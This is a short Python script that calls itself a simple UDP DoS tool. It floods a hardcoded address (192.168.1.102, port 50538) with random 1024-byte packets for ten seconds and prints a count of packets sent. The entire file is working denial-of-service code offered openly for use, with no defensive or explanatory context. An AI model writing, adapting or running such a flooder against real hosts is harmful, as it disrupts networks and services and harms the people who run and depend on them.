import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

print("This is a simple tool for UDP DoS.")

ip = "192.168.1.102"
port = 50538
dur = 10

timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print("Sent %s packets to %s" % (sent, ip))
    except KeyboardInterrupt:
        sys.exit()